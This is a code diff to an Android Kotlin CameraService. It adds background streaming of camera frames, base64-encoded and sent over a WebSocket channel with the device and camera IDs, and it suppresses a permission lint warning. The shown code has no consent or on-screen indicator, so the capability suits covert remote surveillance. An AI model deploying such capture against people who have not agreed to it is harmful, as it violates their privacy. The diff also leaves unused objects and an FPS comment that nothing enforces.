@@ -174,10 +174,14 @@ class CameraService : Service() {
         serviceScope.launch {
             try {
                 AndroidConfig.loadFromPreferences(this@CameraService)
-                val deviceId = android.provider.Settings.Secure.getString(
-                    contentResolver,
-                    android.provider.Settings.Secure.ANDROID_ID
-                )
+                val deviceId = try {
+                    android.provider.Settings.Secure.getString(
+                        contentResolver,
+                        android.provider.Settings.Secure.ANDROID_ID
+                    ) ?: AndroidConfig.deviceId
+                } catch (e: Exception) {
+                    AndroidConfig.deviceId
+                }
 
                 val base64Photo = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
 
@@ -236,13 +240,133 @@ class CameraService : Service() {
         })
     }
 
+    @SuppressLint("MissingPermission")
     private fun startStreamingFrames(cameraId: String) {
-        // Implementation for continuous streaming
-        // Would capture frames and send via WebSocket
+        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        
+        try {
+            val characteristics = manager.getCameraCharacteristics(cameraId)
+            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            // Use smaller resolution for streaming (640x480)
+            val streamSize = Size(640, 480)
+
+            // Close previous if any
+            closeCameraSession()
+            
+            imageReader = ImageReader.newInstance(streamSize.width, streamSize.height, ImageFormat.JPEG, 3)
+            imageReader?.setOnImageAvailableListener({ reader ->
+                if (!isStreaming) return@setOnImageAvailableListener
+                
+                val image = reader.acquireLatestImage()
+                if (image != null) {
+                    try {
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        
+                        // Send frame via WebSocket
+                        sendFrameViaWebSocket(bytes, cameraId)
+                    } finally {
+                        image.close()
+                    }
+                }
+            }, backgroundHandler)
+
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    createStreamingSession()
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                    isStreaming = false
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    Log.e(TAG, "Camera stream error: $error")
+                    camera.close()
+                    cameraDevice = null
+                    isStreaming = false
+                }
+            }, backgroundHandler)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting frame stream: ${e.message}")
+            isStreaming = false
+        }
+    }
+    
+    private fun createStreamingSession() {
+        try {
+            val surface = imageReader?.surface ?: return
+            
+            cameraDevice?.createCaptureSession(
+                listOf(surface),
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                        startRepeatingCapture()
+                    }
+
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        Log.e(TAG, "Streaming session configuration failed")
+                        isStreaming = false
+                    }
+                },
+                backgroundHandler
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creating streaming session: ${e.message}")
+            isStreaming = false
+        }
+    }
+    
+    private fun startRepeatingCapture() {
+        try {
+            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+            captureBuilder?.addTarget(imageReader?.surface ?: return)
+            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+            
+            // Set to capture at ~10 FPS for streaming
+            captureSession?.setRepeatingRequest(captureBuilder?.build()!!, null, backgroundHandler)
+            Log.d(TAG, "Started repeating capture for streaming")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting repeating capture: ${e.message}")
+            isStreaming = false
+        }
+    }
+    
+    private fun sendFrameViaWebSocket(frameBytes: ByteArray, cameraId: String) {
         serviceScope.launch {
-            while (isStreaming) {
-                // Capture frame
-                delay(100) // 10 FPS
+            try {
+                val base64Frame = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
+                
+                val json = JSONObject().apply {
+                    put("command", "subscribe")
+                    put("identifier", JSONObject().apply {
+                        put("channel", "StreamingChannel")
+                    }.toString())
+                }
+                
+                val frameMessage = JSONObject().apply {
+                    put("command", "message")
+                    put("identifier", JSONObject().apply {
+                        put("channel", "StreamingChannel")
+                    }.toString())
+                    put("data", JSONObject().apply {
+                        put("action", "camera_frame")
+                        put("frame", base64Frame)
+                        put("camera_id", cameraId)
+                        put("timestamp", System.currentTimeMillis())
+                    }.toString())
+                }
+                
+                webSocket?.send(frameMessage.toString())
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending frame: ${e.message}")
             }
         }
     }
